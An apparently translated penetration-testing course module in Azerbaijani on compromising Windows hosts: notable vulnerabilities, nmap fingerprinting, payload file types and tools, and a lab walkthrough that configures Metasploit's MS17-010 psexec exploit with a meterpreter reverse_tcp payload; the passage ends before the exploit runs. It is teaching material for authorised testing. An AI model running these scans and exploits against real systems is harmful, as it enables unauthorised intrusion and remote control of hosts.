**Windows-a Daxil Olmaq**

Microsoft-un ev və korporativ hesablama bazarında hökmranlıq etdiyini çoxumuz xatırlayırıq. Müasir dövrdə, təkmilləşdirilmiş Active Directory xüsusiyyətlərinin tətbiqi, bulud xidmətləri ilə daha çox qarşılıqlı əlaqə, Linux üçün Windows alt sistemi və daha çox şeyin təqdim edilməsi ilə Microsoft-un hücum səthi də genişləndi.

Məsələn, sadəcə son beş ildə Microsoft Məhsulları daxilində 3688 təhlükəsizlik boşluğu qeydə alınıb və bu rəqəm hər gün artır. Bu cədvəl BURADAN alınıb.

**Məşhur Windows Ekspluatları**

Son bir neçə ildə Windows əməliyyat sistemi daxilindəki bir neçə təhlükəsizlik boşluğu və onlara uyğun hücumlar dövrümüzün ən çox istifadə edilən təhlükəsizlik boşluqlarından bəziləridir. Gəlin onları bir dəqiqə müzakirə edək:

| Təhlükəsizlik Boşluğu | Təsvir |
| :--- | :--- |
| MS08-067 | MS08-067, SMB qüsuruna görə bir çox müxtəlif Windows versiyalarına tətbiq edilən kritik bir yamaq idi. Bu qüsur Windows hostuna daxil olmağı olduqca asanlaşdırdı. O qədər səmərəli idi ki, Conficker qurdu ondan hər bir həssas hostu yoluxdurmaq üçün istifadə edirdi. Hətta Stuxnet də bu təhlükəsizlik boşluğundan istifadə etdi. |
| Eternal Blue | MS17-010, NSA-dan Shadow Brokers tərəfindən sızdırılan bir eksploatdır. Bu eksploat ən çox WannaCry fidyə tələsi və NotPetya kiber hücumlarında istifadə edilmişdir. Bu hücum SMB v1 protokolundakı, kod icrasına imkan verən bir qüsurdan istifadə edirdi. EternalBlue'nin sadəcə 2017-ci ildə 200,000-dən çox hostu yoluxdurduğu və hələ də həssas Windows hostuna giriş tapmaq üçün ümumi bir yol olduğu güman edilir. |
| PrintNightmare | Windows Çap Spooler'ında uzaqdan kod icrası təhlükəsizlik boşluğu. Həmin host üçün etibarlı şəxsiyyət vəsiqələri və ya aşağı imtiyazlı shell ilə, bir printer qura bilər, sizin üçün işləyən bir driver əlavə edə bilər və sizə hosta sistem səviyyəsində giriş verə bilərsiniz. Bu təhlükəsizlik boşluğu 2021-ci il boyu şirkətləri dağıdır. 0xdf burada bu barədə möhtəşəm bir yazı yazıb. |
| BlueKeep | CVE 2019-0708, Microsoft'un RDP protokolunda Uzaqdan Kod İcrasına imkan verən bir təhlükəsizlik boşluğudur. Bu təhlükəsizlik boşluğu, kod icrası əldə etmək üçün səhv çağırılan bir kanaldan istifadə edərək, Windows 2000-dən Server 2008 R2-yə qədər hər bir Windows versiyasını təsirlədi. |
| Sigred | CVE 2020-1350, DNS-in SIG resurs qeydlərini oxuma şəkli ilə bağlı bir qüsurdan istifadə edib. Bu siyahıdakı digər eksploatlardan bir qədər daha mürəkkəbdir, lakin düzgün həyata keçirilsə, hücum edənə Domain Admin imtiyazları verəcək, çünki bu, domainin DNS serverını təsir edəcək, hansı ki, adətən əsas Domain Controller olur. |
| SeriousSam | CVE 2021-36934, Windows-un `C:\Windows\system32\config` qovluğunda icazələri idarə etmə şəkli ilə bağlı bir problemdən istifadə edir. Problemi düzəltməzdən əvvəl, aşağı səviyyəli istifadəçilər SAM verilənlər bazası da daxil olmaqla digər fayllara çıxış əldə edə bilərlər. Bu, fayllar kompüter tərəfindən istifadə olunarkən əldə edilə bilmədiyi üçün böyük bir problem deyil, lakin həcmi kölgə surəti backup-larına baxdıqda bu təhlükəli olur. Eyni imtiyaz səhvləri backup fayllarında da mövcuddur, bu da hücumçunun SAM verilənlər bazasını oxumasına və şəxsiyyət vəsiqələrini dump etməsinə imkan verir. |
| Zerologon | CVE 2020-1472, Microsoft'un Active Directory Netlogon Remote Protocol (MS-NRPC)-undakı kriptoqrafik bir qüsurdan istifadə edən kritik bir təhlükəsizlik boşluğudur. Bu, istifadəçilərə NT LAN Manager (NTLM) istifadə edərək serverlərə giriş etməyə və hətta protokol vasitəsilə hesab dəyişiklikləri göndərməyə imkan verir. Hücum bir qədər mürəkkəb ola bilər, lakin icra etmək sadədir, çünki hücumçu kompüter hesabı parolunu təxminən 256 dəfə təxmin etməli olacaq. Bu, bir neçə saniyə ərzində baş verə bilər. |

Bu təhlükəsizlik boşluqlarını nəzərə alaraq, Windows heç bir yerə getmir. Biz təhlükəsizlik boşluqlarını müəyyən etmək, onlardan istifadə etmək və Windows hostları və mühitlərində hərəkət etmək bacarığına yiyələnməliyik. Bu anlayışların başa düşülməsi həm də mühitimizi hücumlardan qorumağımıza kömək edə bilər. İndi dərinə getmək və bəzi Windows-a yönəlmiş eksploat əyləncələrini araşdırmaq vaxtıdır.

**Windows-u Sadalama və Üsul Müəyyənləşdirmə**

Bu modul artıq host sadalama mərhələnizi yerinə yetirdiyinizi və hostlarda adətən görülən xidmətləri başa düşdüyünüzü güman edir. Biz sadəcə sizə hostun Windows maşını olma ehtimalını müəyyən etmək üçün bir neçə sürətli hiylə verməyə çalışırıq. Host sadalama və üsul müəyyənləşdirməyə daha ətraflı baxmaq üçün NMAP ilə Şəbəkə Sadalama moduluna nəzər salın.

Bir sıra hədəflərimiz olduğuna görə, hostun Windows Maşını olma ehtimalını müəyyən etmək üçün bir neçə yol nədir? Bu suala cavab vermək üçün bir neçə şeyə baxa bilərik. Birincisi, hostun aktiv olub olmadığını müəyyən etmək üçün ICMP istifadə edərkən Time To Live (TTL) sayacıdır. Windows hostundan tipik bir cavab ya 32 ya da 128 olacaq. 128 və ya 128 civarında bir cavab ən çox rast gələcəyiniz cavabdır. Bu dəyər həmişə dəqiq olmaya bilər, xüsusən də hədəflə eyni üçüncü təbəqə şəbəkəsində deyilsinizsə. Bu dəyəri istifadə edə bilərik, çünki hostların əksəriyyəti başlanğıc nöqtənizdən 20 atlamadan çox uzaqda olmayacaq, buna görə də TTL sayacının başqa bir ƏS növünün məqbul dəyərlərinə düşmə ehtimalı azdır. Aşağıdakı ping nəticəsində buna bir nümunə görə bilərik. Nümunə üçün biz Windows 10 hostuna ping göndərdik və TTL-i 128 olan cavablar aldığımızı görə bilərik. Digər ƏS-lər üzrə TTL dəyərlərini göstərən gözəl cədvəl üçün bu linkə nəzər salın.

**Ping Edilmiş Host**
```bash
nijatmansimov@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

Hostun Windows olub-olmadığını yoxlamaq üçün başqa bir yol, bizim faydalı alətimiz NMAP-dən istifadə etməkdir. Nmap-in daxilində ƏS müəyyənləşdirmə və SNMP-dən toplanmış məlumatlardan tutmuş xüsusi bir təhlükəsizlik boşluğunu yoxlamaq kimi bir çox başqa scriptli skanları yoxlamaq üçün kömək edən sərin bir qabiliyyəti var. Bu nümunə üçün, hədəfimiz 192.168.86.39-a qarşı ƏS Müəyyənləşdirmə skanını başlatmaq üçün `-O` seçimini və `-v` verbose çıxışı ilə istifadə edəcəyik. Aşağıdakı shell sessiyasından keçdikcə və nəticələrə baxdıqca, bir neçə şey bunu Windows hostu kimi göstərir. Bir dəqiqəyə onlara diqqət yetirəcəyik. Shell sessiyasının altına diqqətlə baxın. `OS CPE: cpe:/o:microsoft:windows_10` və `OS details: Microsoft Windows 10 1709 - 1909` kimi qeyd olunan nöqtəni görə bilərik. Nmap bu təxmini TCP/IP yığınından əldə etdiyi bir neçə müxtəlif metrik əsasında etdi. O, bu keyfiyyətləri ƏS-ni müəyyən etmək üçün istifadə edir, onu ƏS barmaq izləri verilənlər bazası ilə yoxlayır. Bu halda, Nmap hostumuzun 1709 və 1909 arasında bir reviziya səviyyəsi olan Windows 10 maşını olduğunu müəyyən etdi.

Əgər problemlərlə qarşılaşsanız və skanlar az nəticə versə, `-A` və `-Pn` seçimləri ilə yenidən cəhd edin. Bu, fərqli bir skan həyata keçirəcək və işləyə bilər. Bu prosesin necə işlədiyi haqqında daha çox məlumat üçün Nmap Sənədlərindən olan bu məqaləyə nəzər salın. Bu aşkarlama metoduna qarşı ehtiyatlı olun. Firewall və ya digər təhlükəsizlik xüsusiyyətlərinin tətbiqi hostu gizlədə bilər və ya nəticələri pozabilər. Mümkün olduqda, müəyyən etmək üçün birdən çox yoxlama istifadə edin.

**ƏS Aşkarlama Skanı**
```bash
nijatmansimov@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

İndi biz Windows 10 hostu ilə işlədiyimizi bildiyimiz üçün, potensial bir istismar yolu olub-olmadığını müəyyən etmək üçün görə biləcəyimiz xidmətləri sadalamalıyıq. Banner qrab etmək üçün bir neçə müxtəlif alətdən istifadə edə bilərik. Netcat, Nmap və bir çox başqaları bizə lazım olan sadalamanı həyata keçirə bilər, lakin bu hal üçün biz `banner.nse` adlanan sadə bir Nmap scriptinə baxacağıq. Nmap-in açıq gördüyü hər bir port üçün, porta qoşulmağa cəhd edəcək və ondan əldə edə biləcəyi hər hansı məlumatı toplayacaq. Aşağıdakı sessiyada, Nmap hər porta qoşulmağa cəhd etdi, lakin cavab verən yeganə portlar 902 və 912 portları idi. Səhifə banner-ına əsasən, onların VMWare Workstation ilə əlaqəsi var. Biz həmin protokolla əlaqəli bir eksploat tapmağa cəhd edə bilərik və ya digər portları daha da sadalaya bilərik. Real bir pentestdə, torpağın tam şəkildə əlinizdə olduğundan əmin olmaq üçün mümkün qədər hərtərəfli olmaq istəyəcəksiniz.

**Portları Sadalamaq üçün Banner Qrab**
```bash
nijatmansimov@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

Yuxarıda göstərilən nümunələr hostun Windows maşını olub-olmadığını müəyyən etməyə kömək etmək üçün yalnız bir neçə yoldur. Bu, heç də tam siyahı deyil və edə biləcəyiniz bir çox başqa yoxlamalar var. İndi ki, üsul müəyyənləşdirməni müzakirə etdik, gəlin bir neçə fayl növünə və payload-lar qurarkən onlardan nə üçün istifadə edilə biləcəyinə baxaq.

**Bats, DLL-lər və MSI Faylları, Vay!**

Windows hostları üçün payload-lar yaratmaq gəldikdə, seçmək üçün çoxlu seçimlərimiz var. DLL-lər, batch faylları, MSİ paketləri və hətta PowerShell scriptləri istifadə ediləcək ən ümumi üsullardan bəziləridir. Hər bir fayl növü bizim üçün müxtəlif şeylər həyata keçirə bilər, lakin hamısının ortaq cəhəti onların hostda icra oluna bilən olmasıdır. Payload üçün çatdırma mexanizminizi nəzərdə tutmağa çalışın, çünki bu, istifadə edəcəyiniz payload növünü müəyyən edə bilər.

**Nəzərə Alınacaq Payload Növləri**

*   **DLL-lər:** Dinamik Link Kitabxanası (DLL) Microsoft əməliyyat sistemlərində bir çox müxtəlif proqram tərəfindən eyni vaxtda istifadə edilə bilən paylanmış kod və məlumat təmin etmək üçün istifadə olunan kitabxana faylıdır. Bu fayllar moduldur və bizə daha dinamik və yenilənməsi daha asan olan tətbiqlərə sahib olmağa imkan verir. Pentester kimi, zərərli bir DLL yeritmək və ya hostda həssas bir kitabxananı ələ keçirmək bizim imtiyazlarımızı SYSTEM səviyyəsinə qaldıra bilər və/və ya İstifadəçi Hesabı Nəzarətindən (UAC) yan keçə bilər.
*   **Batch:** Batch faylları sistem administratorları tərəfindən əmr sətiri interpretatoru vasitəsilə çoxlu tapşırıqları yerinə yetirmək üçün istifadə olunan mətn əsaslı DOS scriptləridir. Bu fayllar `.bat` genişlənməsi ilə bitir. Biz batch fayllarını hostda əmrləri avtomatlaşdırılmış şəkildə işlətmək üçün istifadə edə bilərik. Məsələn, hostda bir port açan və ya hücum edən qutumuzla əlaqə quran bir batch faylı ola bilər. Bu edildikdən sonra, o, əsas sadalama addımlarını həyata keçirə və açıq port vasitəsilə bizə məlumatı geri ötürə bilər.
*   **VBS:** VBScript, Microsoft-un Visual Basic-inə əsaslanan yüngül script dilidir. Adətən, dinamik veb səhifələri aktivləşdirmək üçün veb serverlərdə müştəri tərəfli script dili kimi istifadə olunur. VBS köhnəlib və müasir veb brauzerlərin əksəriyyəti tərəfindən deaktiv edilib, lakin Phishing və istifadəçilərin excel sənədində Makro-ların yüklənməsini aktivləşdirmək və ya Windows script mühərrikinin bir kod parçasını icra etməsi üçün hüceyrəyə klik etmək kimi hərəkətlər yerinə yetirməsinə yönəlmiş digər hücumlar kontekstində yaşayır.
*   **MSI:** `.MSI` faylları Windows Quraşdırıcısı üçün quraşdırma verilənlər bazası kimi xidmət edir. Yeni bir tətbiq quraşdırmağa cəhd edərkən, quraşdırıcı bütün tələb olunan komponentləri başa düşmək və onları necə tapmaq üçün `.msi` faylına baxacaq. Biz Windows Quraşdırıcısını `.msi` faylı kimi hazırlanmış bir payload istifadə edərək istifadə edə bilərik. Onu hosta əldə etdikdən sonra, biz faylımızı icra etmək üçün `msiexec` işlədə bilərik, bu da bizə daha da giriş, məsələn, yüksəldilmiş bir reverse shell təmin edəcək.
*   **Powershell:** Powershell həm shell mühiti, həm də script dilidir. O, Microsoft-un əməliyyat sistemlərində müasir shell mühiti kimi xidmət edir. Script dili kimi, o, .NET Common Language Runtime-a əsaslanan dinamik bir dildir ki, onun shell komponenti kimi, giriş və çıxışı .NET obyektləri kimi qəbul edir. PowerShell bizə shell əldə etmə və hostda icra etmə baxımından, həmçinin penetration test prosesimizdə bir çox digər addımlarda bir çox seçim təmin edə bilər.

İndi ki, hər bir Windows fayl növünün nə üçün istifadə edilə biləcəyini başa düşdük, gəlin shell əldə etmək üçün payload-larımızı qurmaq və onları hosta çatdırmaq üçün bəzi əsas alətlər, taktikalər və prosedurları müzakirə edək.

**Payload Generasiyası, Transferi və İcrası üçün Alətlər, Taktikalar və Prosedurlar**

Aşağıda müxtəlif payload generasiya metodlarının nümunələrini və payload-larımızı qurbanlara köçürmə yollarını tapacaqsınız. Biz bu metodlardan bəzilərini yüksək səviyyədə müzakirə edəcəyik, çünki diqqətimiz payload generasiyasının özünə və hədəfdə shell əldə etməyin müxtəlif yollarına yönəlib.

**Payload Generasiyası**

Windows hostlarına qarşı istifadə etmək üçün payload-lar yaratmaq üçün çoxlu yaxşı seçimlərimiz var. Bunların bəzilərinə artıq əvvəlki bölmələrdə toxunduq. Məsələn, Metasploit-Framework və MSFVenom payload-lar yaratmaq üçün çox faydalı bir yoldur, çünki o, ƏS-dən asılı deyil. Aşağıdakı cədvəl bəzi seçimlərimizi göstərir. Lakin bu, tam siyahı deyil və hər gün yeni resurslar ortaya çıxır.

| Resurs | Təsvir |
| :--- | :--- |
| MSFVenom & Metasploit-Framework | Mənbə MSF hər hansı bir pentester alət dəstində olduqca çox yönlü bir alətdir. O, hostları sadalamaq, payload-lar yaratmaq, ictimai və xüsusi eksploatlardan istifadə etmək və hostda olduqdan sonra post-eksploitasiya hərəkətlərini yerinə yetirmək üçün bir yol kimi xidmət edir. Onu bir çox funksiyalı alət kimi düşünün. |
| Payloads All The Things | Mənbə Burada, payload generasiyası və ümumi metodologiya üçün bir çox müxtəlif resurs və istifadə qaydası tapa bilərsiniz. |
| Mythic C2 Framework | Mənbə Mythic C2 çərçivəsi Metasploit-ə alternativ seçim kimi Əmr və Nəzarət Çərçivəsi və unikal payload generasiyası üçün alət qutusudur. |
| Nishang | Mənbə Nishang, Offensive PowerShell implantlarının və scriptlərinin çərçivə kolleksiyasıdır. O, hər hansı bir pentester üçün faydalı ola biləcək bir çox utilitləri əhatə edir. |
| Darkarmour | Mənbə Darkarmour, Windows hostlarına qarşı istifadə üçün qarışdırılmış ikili fayllar yaratmaq və istifadə etmək üçün bir alətdir. |

**Payload Transferi və İcrası:**

Web-drive-by, phishing e-poçtları və ya dead drops vektorlarından başqa, Windows hostları bizə payload çatdırmaq üçün bir neçə başqa yol təmin edə bilər. Aşağıdakı siyahıda hədəfə payload atmağa çalışarkən istifadə üçün faydalı bəzi alətlər və protokollar daxildir.

*   **Impacket:** Impacket Python-da qurulmuş bir alət dəstidir ki, bizə birbaşa şəbəkə protokolları ilə qarşılıqlı əlaqədə olmaq üçün yol təmin edir. Impacket-də qayğılandığımız ən maraqlı alətlərdən bəziləri psexec, smbclient, wmi, Kerberos və SMB server qurmaq qabiliyyəti ilə əlaqədardır.
*   **Payloads All The Things:** faylları hostlar arasında sürətlə köçürməyə kömək etmək üçün sürətli oneliner-lar tapmaq üçün əla resursdur.
*   **SMB:** SMB, faylları hostlar arasında köçürmək üçün asan istismar oluna bilən bir yol təmin edə bilər. Bu, xüsusilə faydalı ola bilər ki, qurban hostları domainə qoşulub və məlumatları host etmək üçün paylaşımlardan istifadə edirlər. Biz, hücum edənlər kimi, bu SMB fayl paylaşımlarından, həmçinin C$ və admin$ ilə birlikdə payload-larımızı host etmək və köçürmək, hətta data sızdırmaq üçün istifadə edə bilərik.
*   **MSF vasitəsilə uzaqdan icra:** Metasploit-dəki bir çox eksploat modullarının daxilində payload-ları avtomatik olaraq quracaq, hazırlayacaq və icra edəcək bir funksiya var.
*   **Digər Protokollar:** Hosta baxarkən, FTP, TFTP, HTTP/S və daha çoxu kimi protokollar sizə hosta faylları yükləmək üçün bir yol təmin edə bilər. Açıq və istifadə üçün mövcud olan funksiyaları sadalayın və diqqət yetirin.

İndi ki, payload-larımızı köçürmək üçün istifadə edə biləcəyimiz alətləri, taktikaları və prosedurları bildik, gəlin bir nümunə kompromis prosesinə nəzər salaq.

**Nümunə Kompromis Addım-addım Təsviri**

**Hostu Sadalayın**

Ping, Netcat, Nmap skanları və hətta Metasploit potensial qurbanlarımızı sadalamağa başlamaq üçün yaxşı seçimlərdir. Bu dəfə başlamaq üçün bir Nmap skanı istifadə edəcəyik. Hər hansı bir eksploit zəncirinin sadalama hissəsi, arqument olaraq, tapmacanın ən kritik parçasıdır. Hədəfi və onun necə işlədiyini başa düşmək shell əldə etmə şansınızı artıracaq.

**Hostu Sadalayın**
```bash
nijatmansimov@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29
```

Biz skan etmə və nümunə hostun doğrulanması zamanı bir neçə şeyi anladıq. O, Windows Server 2016 Standard 6.3 işlədir. İndi host adımız var və onun domain-də olmadığını və bir neçə xidmət işlətdiyini bilirik. İndi ki, bəzi məlumatları topladıq, gəlin potensial eksploit yolunu müəyyən edək.

IIS potensial bir yol ola bilər, Impacket kimi bir alətdən istifadə edərək SMB üzərindən hosta çatmağa cəhd etmək və ya şəxsiyyət vəsiqələrimiz olsaydı, doğrulama edə bilərdik və ƏS perspektivindən, RCE üçün bir yol da ola bilər. MS17-010 (EternalBlue)-un Windows 2008-dən Server 2016-ya qədər olan hostları təsir etdiyi məlumdur. Bunu nəzərə alaraq, qurbanımızın həssas olması güclü bir ehtimal ola bilər, çünki o, bu pəncərəyə düşür. Gəlin bunu Metasploit-dən daxili bir köməkçi yoxlama, `auxiliary/scanner/smb/smb_ms17_010` istifadə edərək doğrulayaq.

**Eksploit yolu axtarın və qərar verin**

`msfconsole` açın və EternalBlue axtarın, ya da yoxlama üçün aşağıdakı sessiyadakı sətri istifadə edə bilərsiniz. `RHOSTS` sahəsini hədəfin IP ünvanı ilə təyin edin və skanı başladın. Modulun seçimlərində göründüyü kimi, SMB tənzimləmələrini daha çox doldura bilərsiniz, lakin bu lazım deyil. Onlar yoxlamanın uğurlu olma ehtimalını artırmağa kömək edəcək. Hazır olduqda, `run` yazın.

**Eksploit Yolunu Müəyyənləşdirin**
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

İndi, yoxlama nəticələrindən görə bilərik ki, hədəfimiz çox güman ki, EternalBlue-ya qarşı həssasdır. Gəlin indi eksploiti və payload-u quraq, sonra bir cəhd edək.

**Eksploit və Payload-u Seçin, sonra Çatdırın**

**Eksploit və Payload-umuzu Seçin və Konfiqurasiya Edin**
```
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Bu hal üçün, biz EternalBlue ilə uyğun gələn bir eksploit axtarmaq üçün MSF-nin eksploit modullarını `search` funksiyasından istifadə edərək araşdırdıq. Yuxarıdakı siyahı nəticə idi. Mən bu eksploitin psexec versiyası ilə daha çox uğur qazandığım üçün, əvvəlcə onu sınayacağıq. Gəlin onu seçək və quraşdırmanı davam etdirək.

**Eksploiti və Payload-u Konfiqurasiya Edin**
```
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Eksploiti işlətməzdən əvvəl payload seçimlərinizi düzgün təyin etdiyinizə əmin olun. `Required`-u `yes` olaraq təyin olunan hər hansı bir seçim doldurulması zəruri bir yer olacaq. Bu halda, `RHOSTS`, `LHOST` və `LPORT` sahələrimizin düzgün təyin olunduğuna əmin olmalıyıq. Bu cəhd üçün, qalanları üçün standartları qəbul etmək OK-dur.

**Seçimlərimizi Doğrulayın**
```
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
